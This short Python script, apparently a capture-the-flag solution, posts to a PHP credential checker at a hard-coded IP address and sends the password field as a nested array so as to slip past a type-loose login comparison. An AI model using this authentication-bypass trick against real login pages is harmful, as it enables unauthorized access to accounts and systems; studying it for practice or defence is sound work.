import requests as req

url = "http://103.152.242.242:50234/checkcred.php"

user = "aebeceh"
passwd = "*"
serialized = "username="+user+"&password="+passwd

r = req.post(url, data={
    "username": user,
    "password": {
        "password": []
    },
})

print(r)
print(r.content)